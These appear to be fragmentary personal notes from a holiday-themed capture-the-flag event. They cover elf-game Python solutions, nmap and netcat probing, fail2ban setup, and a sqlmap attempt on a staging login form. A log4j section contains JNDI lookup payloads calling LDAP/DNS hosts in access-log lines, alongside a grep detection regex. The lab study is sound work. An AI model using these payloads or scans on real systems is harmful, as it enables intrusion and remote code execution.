elf.moveTo(lever0.position)

lever0.pull(leverdata)
elf.moveTo(lollipop0.position)
elf.moveUp(100)

4. 

import elf, munchkins, levers, lollipops, yeeters, pits
lever0, lever1, lever2, lever3, lever4 = levers.get()
elf.moveLeft(2)
lever4.pull("A String")
elf.moveTo(lever3.position)
lever3.pull(True)
elf.moveTo(lever2.position)
lever2.pull(1)
elf.moveTo(lever1.position)
lever1.pull([1])
elf.moveTo(lever0.position)
lever0.pull({})
elf.moveUp(100)

5. 

lever0, lever1, lever2, lever3, lever4 = levers.get()
elf.moveLeft(2)
lever4.pull("undefined concatenate")
elf.moveTo(lever3.position)
lever3.pull(True)
elf.moveTo(lever2.position)
lever2.pull(lever2.data() + 1)
elf.moveTo(lever1.position)
a = lever1.data()
a.append(1)
lever1.pull(a)
elf.moveTo(lever0.position)
b = lever0.data()
b['strkey'] = "strvalue"
lever0.pull(b)
elf.moveUp(100)

6. 
wait for the array input

```
import elf, munchkins, levers, lollipops, yeeters, pits
lever = levers.get(0)
data = lever.data()
if type(data) == type([]):
    for i in range(len(data)):
        data[i] = data[i] + 1
print(data)
#elf.move
elf.moveTo(lever.position)
#lever.something
lever.pull(data)
elf.moveUp(10000)
```

7. 

8. 

import elf, munchkins, levers, lollipops, yeeters, pits
all_lollipops = lollipops.get()
lever = levers.get(0)
a = ["munchkins rule"] + lever.data()
for lollipop in all_lollipops:
    elf.moveTo(lollipop.position)
elf.moveTo(lever.position)
lever.pull(a)
elf.moveLeft(100)
elf.moveDown(100)
elf.moveLeft(3)
elf.moveUp(1000)

# caramel santiago
They were dressed for 4.0°C and overcast conditions. The elf mentioned something about Stack Overflow and Golang.

flask cookie

`using flas unsign` not working
1. try 1
hogmany - scotland
tab for indent

They said, if asked, they would describe their next location in three words as "frozen, push, and tamed.
ofcom uk
They were dressed for 11.0°C and overcast conditions. The elf mentioned something about Stack Overflow and C#.

They said, if asked, they would describe their next location as "only milder vanilla."
slack

2. try 2


# exif tool

last modified by Jack frost
2021-12-21

# splunk

git status
git@github.com:elfnp3/partnerapi.git
docker compose up
https://github.com/snoopysecurity/dvws-node
holiday-utils-js
/usr/bin/nc.openbsd
6
preinstall.sh

whiz


# ipv6 console

192.168.160.3

2604:6000:1528:cd:d55a:f8a7:d30a:2
02:42:c0:a8:a0:03
fe80::42:c0ff:fea8:a003

ping 2604:6000:1528:cd:d55a:f8a7:d30a:2
ping 02:42:c0:a8:a0:03
ping fe80::42:c0ff:fea8:a003

nmap -A -p- 192.168.160.3
nmap -6 -A 02:42:c0:a8:a0:03
nmap -6 -A -p- fe80::42:c0ff:fea8:a003
nmap -6 -A -p- 2604:6000:1528:cd:d55a:f8a7:d30a:2

netcat
nmap
ping/ ping6
curl

ashwin.ipvguest.kringlecastle.com

nmap unable to 
```
ping 2001:7b8:666:ffff::1:42 -I eth0
nmap -6 -sP 2604:6000:1528:cd:d55a:f8a7:d30a:2%eth0
curl http://[2604:6000:1528:cd:d55a:f8a7:d30a:2]:8080/ --interface eth0
wget http://[2604:6000:1528:cd:d55a:f8a7:d30a:2]:8080/
telnet -6 2604:6000:1528:cd:d55a:f8a7:d30a:2
nc -6 2001:7b8:666:ffff::1:42%eth0 23

```

# santa's log naughty list

tail /var/log/hohono.log

/root/naughtlylist add 12.34.56.78

/etc/fail2ban/filter.d
/etc/fail2ban/action.d
/etc/fail2ban/jail.d

cat /var/log/hohono.log |cut -d ' ' -f 3,4,5,6,7,8,9 |  sort -u | uniq
cat /var/log/hohono.log | grep "rejected" |cut -d ' ' -f 5 |  sort -u | uniq

talk here : https://www.youtube.com/watch?v=Fwv2-uV6e5I

/etc/fail2ban/jail.d/ssh.conf
/etc/fail2ban/jail.local

[sshd]
enabled = true
maxretry = 10
findtime = 15m
bantime = 1h

sudo service fail2ban restart
tail -f /var/log/fail2ban.log

/etc/fail2ban/jail.conf

We can create our own file in /etc/fail2ban/filter.d

failregex and ignoreregex

/etc/fail2ban/filter.d/my_filter_name.conf 8.39 min
[Definition]
failregex = 


8.52 for action 

/etc/fail2ban/jail.d/my_jail.conf 11.23

$ to end the line

help : 

Can you configure Fail2Ban to detect and block the bad IPs?

 * You must monitor for new log entries in /var/log/hohono.log
 * If an IP generates 10 or more failure messages within an hour then it must
   be added to the naughty list by running naughtylist add <ip>
        /root/naughtylist add 12.34.56.78
 * You can also remove an IP with naughtylist del <ip>
        /root/naughtylist del 12.34.56.78
 * You can check which IPs are currently on the naughty list by running
        /root/naughtylist list

You'll be rewarded if you correctly identify all the malicious IPs with a
Fail2Ban filter in /etc/fail2ban/filter.d, an action to ban and unban in
/etc/fail2ban/action.d, and a custom jail in /etc/fail2ban/jail.d. Don't
add any nice IPs to the naughty list!

COMMANDS

2021-12-15 11:18:22 Invalid heartbeat 'charlie' from 171.104.46.179
2021-12-15 11:18:12 Failed login from 171.104.46.179 for jewel
2021-12-15 11:19:36 Login from 154.103.37.179 rejected due to unknown user name
2021-12-15 13:08:05 131.112.13.154 sent a malformed request

nano /etc/fail2ban/filter.d/my_rules.conf
fail2ban-regex /var/log/hohono.log /etc/fail2ban/filter.d/my_rules.conf

[Definition]
failregex = .*Invalid heartbeat 'charlie' from 171.104.46.179*X-Forwarded-For: <HOST>.*

[Definition]
failregex = .* Invalid .* <HOST> .*$

Not able to configure fail2ban, its just a configuration challenge.

# Jack frost tower

csrf token: kLTFbtPG-ejA6LyRzyH74nBtB7VDZdXA9NVY

gave the entire source code 
should we try sqlmap

post data: _csrf=Z1ut1EkD-6UHZNNAwzqsomNg9D4OrKVVlotk&email=sss%40gmail.com&submit=Send+Instruction
post url: https://staging.jackfrosttower.com/forgotpass

Raw post request

POST /forgotpass HTTP/2
Host: staging.jackfrosttower.com
Cookie: _csrf=bvGbFbTyAhG8BLjRXfPDdyO6; connect.sid=s%3AN1iBihD_OQ2e-x1dyAidy2t6JBmsJG0h.%2FfQ8S%2FuLDnvdH7HAh4%2FnGpy5g0YsvE%2B5moa10avYUbQ
Content-Length: 83
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://staging.jackfrosttower.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://staging.jackfrosttower.com/forgotpass
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

_csrf=TfaVFtpp-PcXab81MxzejhwXZfVfYiM_IS-g&email=a%40gm.com&submit=Send+Instruction

trying sqlmap : sqlmap -r post_jackfrosttower.txt -p email

sqlmap unable to complete.

# log4j blue team

use `javac` to compile
use `java` to run

log4j is used for exception handling

```
use of log4j
import java.io.*;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class DisplayFilev2 {
    static Logger logger = LogManager.getLogger(DisplayFilev2.class);
    public static void main(String[] args) throws Exception {
        String st;
        try {
            File file = new File(args[0]);
            BufferedReader br = new BufferedReader(new FileReader(file));

            while ((st = br.readLine()) != null)
                System.out.println(st);
        }
        catch (Exception e) {
            logger.error("Unable to read file " + args[0] + " (make sure you specify a valid file name).");
        }
    }
}
```

elfu@8e2faf5a9f06:~/vulnerable$ java DisplayFilev2 '${java:version}'
11:13:54.096 [main] ERROR DisplayFilev2 - Unable to read file Java version 1.8.0_312 (make sure you specify a valid file name).

f5a9f06:~$ logshell-search.sh /var/log/www
/var/log/www/access.log:10.26.4.27 - - [14/Dec/2021:11:21:14 +0000] "GET /solr/admin/cores?foo=${jndi:ldap://10.26.4.27:1389/Evil} HTTP/1.1" 200 1311 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0"
/var/log/www/access.log:10.99.3.1 - - [08/Dec/2021:19:41:22 +0000] "GET /site.webmanifest HTTP/1.1" 304 0 "-" "${jndi:dns://10.99.3.43/NothingToSeeHere}"
/var/log/www/access.log:10.3.243.6 - - [08/Dec/2021:19:43:35 +0000] "GET / HTTP/1.1" 304 0 "-" "${jndi:ldap://10.3.243.6/DefinitelyLegitimate}"

searching for log

!/bin/sh
grep -E -i -r '\$\{jndi:(ldap[s]?|rmi|dns):/[^\n]+' $1

# strace ltrace

kotton_kandy_co@f3a3c868cf29:~$ echo "Registration:True" > registration.json
kotton_kandy_co@f3a3c868cf29:~$ ./make_the_candy    

# kerberoasting

Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal. Find Eve Snowshoes in Santa's office for hints.

